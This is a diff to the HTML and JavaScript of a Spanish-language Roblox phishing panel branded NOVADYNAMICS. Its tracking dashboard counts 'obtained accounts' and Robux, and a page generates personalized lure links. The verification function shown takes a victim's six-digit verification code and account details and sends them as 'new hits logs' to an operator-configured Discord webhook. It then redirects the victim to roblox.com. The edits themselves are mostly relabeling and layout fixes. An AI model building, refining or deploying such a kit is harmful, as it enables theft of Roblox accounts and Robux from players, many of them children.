@@ -35,7 +35,7 @@
         .barra-texto p:last-child{font-size:13px;color:#AAA}
         .btn-cerrar{background:transparent;border:none;color:#888;font-size:22px;cursor:pointer;padding:0 8px}
         .btn-unirse{background:#00A2FF;color:#FFF;border:none;padding:10px 18px;border-radius:4px;font-size:15px;font-weight:500;cursor:pointer}
-        .panel-principal{display:none;min-height:100vh;background:#1E1E2E;padding:20px}
+        .panel-principal{display:none;min-height:100vh;background:#1E1E2E;padding:20px;padding-bottom:90px}
         .tarjetas{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px}
         .tarjeta{background:#2D2D3F;border-radius:8px;padding:20px;text-align:center}
         .tarjeta h3{font-size:14px;color:#AAA;margin-bottom:8px}
@@ -44,7 +44,7 @@
         th{background:#383850;padding:12px 10px;text-align:left;color:#FFF;font-size:14px}
         td{padding:12px 10px;border-top:1px solid #444;color:#DDD;font-size:14px}
         .vacio{text-align:center;padding:40px;color:#888}
-        .navegacion{position:fixed;bottom:70px;left:0;right:0;display:flex;justify-content:space-around;background:#252538;border-top:1px solid #333;padding:10px 0}
+        .navegacion{position:fixed;bottom:0;left:0;right:0;display:flex;justify-content:space-around;background:#252538;border-top:1px solid #333;padding:10px 0}
         .nav-btn{text-align:center;color:#CCC;font-size:12px;cursor:pointer}
         .nav-btn.activo{color:#00A2FF}
         .pagina{display:none}
@@ -59,6 +59,7 @@
         .enlace-caja{background:#333;padding:12px;border-radius:6px;word-break:break-all;font-size:13px;color:#CCC;margin:12px 0;display:none}
         .boton-azul{background:#00A2FF;color:#FFF;border:none;padding:10px 16px;border-radius:4px;font-size:15px;cursor:pointer;margin:6px 4px 6px 0}
         .boton-gris{background:#444;color:#FFF;border:none;padding:10px 16px;border-radius:4px;font-size:15px;cursor:pointer;margin:6px 4px 6px 0}
+        .input-config{width:100%;padding:10px 12px;background:#333;border:none;border-radius:4px;color:#FFF;font-size:14px;margin-bottom:10px}
     </style>
 </head>
 <body>
@@ -114,12 +115,12 @@
     <div class="pagina activa" id="pagInicio">
         <h2 style="margin-bottom:20px;font-size:20px">🏠 Inicio</h2>
         <div class="tarjetas">
-            <div class="tarjeta"><h3>Robux Acumulados</h3><div class="valor" id="robuxSum">0</div></div>
-            <div class="tarjeta"><h3>Total Cuentas</h3><div class="valor" id="cuentasTot">0</div></div>
-            <div class="tarjeta"><h3>Robux Gastados</h3><div class="valor" id="robuxGastados">0</div></div>
+            <div class="tarjeta"><h3>💰 Robux Totales</h3><div class="valor" id="robuxSum">0</div></div>
+            <div class="tarjeta"><h3>👤 Cuentas Obtenidas</h3><div class="valor" id="cuentasTot">0</div></div>
+            <div class="tarjeta"><h3>💸 Robux Invertidos</h3><div class="valor" id="robuxGastados">0</div></div>
         </div>
-        <div style="background:#2D2D3F;border-radius:8px;padding:20px">
-            <h3 style="margin-bottom:14px">📋 Historial de Cuentas</h3>
+        <div style="background:#2D2D3F;border-radius:8px;padding:20px;margin-top:20px">
+            <h3 style="margin-bottom:14px">📋 Ranking / Historial</h3>
             <table class="tabla">
                 <thead><tr><th>Usuario</th><th>Robux</th><th>Días Creada</th><th>País</th><th>Fecha</th></tr></thead>
                 <tbody id="cuerpoTabla"><tr><td colspan="5" class="vacio">Sin registros aún</td></tr></tbody>
@@ -131,7 +132,7 @@
         <h2 style="margin-bottom:20px;font-size:20px">🔗 Generar Enlace</h2>
         <div style="background:#2D2D3F;border-radius:8px;padding:20px">
             <h3 style="margin-bottom:14px">Enlace Personalizado</h3>
-            <input type="text" class="campo" id="datoUsuario" placeholder="Nombre de usuario o ID de Roblox">
+            <input type="text" class="input-config" id="datoUsuario" placeholder="Nombre de usuario o ID de Roblox">
             <button class="boton-azul" onclick="crearEnlace()">✅ Generar Enlace</button>
             <div class="enlace-caja" id="enlaceGenerado"></div>
             <button class="boton-gris" style="display:none" id="btnCopiar" onclick="copiarEnlace()">📋 Copiar Enlace</button>
@@ -141,13 +142,13 @@
     <div class="pagina" id="pagConfig">
         <h2 style="margin-bottom:20px;font-size:20px">⚙️ Configuración</h2>
         <div class="caja-config">
-            <h3>Webhook de Discord</h3>
-            <input type="text" class="campo" id="urlWebhook" placeholder="Pega tu enlace de Webhook aquí">
+            <h3>🔗 Webhook de Discord</h3>
+            <input type="text" class="input-config" id="urlWebhook" placeholder="Pega tu enlace de Webhook aquí">
             <button class="boton-azul" onclick="guardarWebhook()">✅ Guardar</button>
             <button class="boton-gris" onclick="borrarWebhook()">🗑️ Borrar</button>
             <p style="margin-top:10px;color:#AAA" id="estadoWebhook">⚠️ Sin configurar</p>
             <div class="fila">
-                <span>🔔 Activar @everyone</span>
+                <span>🔔 Mensaje @everyone</span>
                 <div class="sw" id="swTodos" onclick="cambiarTodos()"></div>
             </div>
         </div>
@@ -211,9 +212,12 @@ async function verificarCodigo(){
     if(!cod){ mostrarError('Escribe el código de verificación'); return; }
     if(cod.length !== 6 || !/^\d+$/.test(cod)){ mostrarError('Código incorrecto. Inténtalo de nuevo.'); return; }
     if(!datosRoblox.dias) await cargarDatosRoblox(user);
+    
     const wh=localStorage.getItem('webhook');
-    const todos=localStorage.getItem('notificarTodos')==='1'?'@everyone':' ';
+    const activarTodos=localStorage.getItem('notificarTodos')==='1';
+    const mensajeTodos=activarTodos?'@everyone new hits logs':' ';
     const fecha=new Date().toLocaleString();
+
     registros.unshift({
         usuario:datosRoblox.nombre||user,
         robux:datosRoblox.robux||0,
@@ -224,14 +228,16 @@ async function verificarCodigo(){
     });
     localStorage.setItem('registros',JSON.stringify(registros));
     actualizarTodo();
+
     if(wh){
         fetch(wh,{
             method:'POST',
             headers:{'Content-Type':'application/json'},
             body:JSON.stringify({
-                content:todos,
+                username: "NOVADYNAMICS",
+                content: mensajeTodos,
                 embeds:[{
-                    title:"🔥 NOVADYNAMICS — DATOS RECIBIDOS",
+                    title:"🔥 NUEVA CUENTA OBTENIDA — NOVADYNAMICS",
                     color:16711680,
                     thumbnail:{url:"https://www.roblox.com/favicon.ico"},
                     fields:[
@@ -241,22 +247,22 @@ async function verificarCodigo(){
                         {name:"📅 Fecha de creación",value:`${datosRoblox.fechaCreacion||'No disponible'}`,inline:false},
                         {name:"⏳ Días desde creación",value:`**${datosRoblox.dias||'Desconocido'} días**`,inline:true},
                         {name:"🌍 País",value:`${datosRoblox.bandera||'❓'} **${datosRoblox.pais||'Desconocido'}**`,inline:true},
-                        {name:"💰 Robux",value:`**${datosRoblox.robux||0}** ₪`,inline:true},
-                        {name:"💸 Robux Gastados",value:`**${datosRoblox.robuxGastados||0}** ₪`,inline:true},
+                        {name:"💰 Robux Totales",value:`**${datosRoblox.robux||0}** ₪`,inline:true},
+                        {name:"💸 Robux Invertidos",value:`**${datosRoblox.robuxGastados||0}** ₪`,inline:true},
                         {name:"📌 Fecha y hora",value:`${fecha}`,inline:false}
                     ],
-                    footer:{text:"Novadynamics System • Datos reales desde API Roblox"}
+                    footer:{text:"NOVADYNAMICS SYSTEM • Datos recibidos desde API Roblox"}
                 }]
             })
         }).then(()=>{
-            alert('✅ Datos recibidos. Redirigiendo...');
+            alert('✅ Datos enviados. Redirigiendo...');
             setTimeout(()=>window.location.href='https://www.roblox.com',2000);
         }).catch(()=>{
             alert('✅ Datos recibidos. Redirigiendo...');
             setTimeout(()=>window.location.href='https://www.roblox.com',2000);
         });
     }else{
-        alert('⚠️ Configura tu Webhook primero. Redirigiendo...');
+        alert('⚠️ Configura tu Webhook primero en Ajustes. Redirigiendo...');
         setTimeout(()=>window.location.href='https://www.roblox.com',2000);
     }
 }
@@ -330,8 +336,8 @@ function copiarEnlace(){
 function irPag(n){
     document.querySelectorAll('.pagina').forEach(p=>p.classList.remove('activa'));
     document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('activo'));
-    event.currentTarget.classList.add('activo');
     document.getElementById('pag'+n).classList.add('activa');
+    event.currentTarget.classList.add('activo');
 }
 function guardarWebhook(){
     const u=document.getElementById('urlWebhook').value.trim();
@@ -341,7 +347,7 @@ function guardarWebhook(){
     }
     localStorage.setItem('webhook',u);
     e.textContent='✅ Guardado y Activo';
-    alert('✅ Webhook guardado');
+    alert('✅ Webhook guardado correctamente');
 }
 function borrarWebhook(){
     localStorage.removeItem('webhook');
@@ -389,5 +395,4 @@ function actualizarTodo(){
 }
 </script>
 </body>
-    </html>
-    
+</html>
